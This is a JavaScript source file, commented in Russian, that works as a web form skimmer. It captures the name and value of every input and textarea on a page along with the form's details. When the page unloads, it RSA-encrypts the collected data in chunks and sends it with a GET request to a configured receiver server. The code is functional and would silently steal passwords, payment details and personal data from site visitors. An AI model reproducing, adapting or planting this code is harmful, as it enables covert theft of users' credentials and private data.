import $ from 'jquery';

import ASN1 from 'jsencrypt';
import JSEncrypt from 'jsencrypt';
import options from './options/options'

//Записываем данные из инпутов
let data = [];
$('input,textarea').on('change', function(e){
    let result = {
        name: e.target.name,
        value: e.target.value
    };

    //Добавляем данные о форме которой принадлежит инпут (если есть)
    let form = $(e.target).closest('form');
    if (form){
        result.form = {
            name: form.attr('name'),
            id: form.attr('id'),
            action: form.attr('action'),
            method: form.attr('method')
        }
    }

    data.push(result);
});

//При покидании странцы - отправляем данные на сервер-приемник
window.onbeforeunload = function (e) {
    var encrypt = new JSEncrypt();
    encrypt.setPublicKey(options.pubKey);

    let result = {
        location: window.location.href,
        data: data
    };

    //Необходимую информацию загоняем в JSON строку
    let dataString = JSON.stringify(result);

    //И делим её на куски фиксированной длины (для последующего шифрования)
    let dataPieces = dataString.match(/.{1,85}/g);

    //Формируем закодированную строку
    let encryptedData = [];
    for (var dataPiece of dataPieces) {
        encryptedData.push(encrypt.encrypt(dataPiece));
    }

    //Отправляем данные на сервер приёмник
    $.get( options.serverUrl, { data: encryptedData } );
};
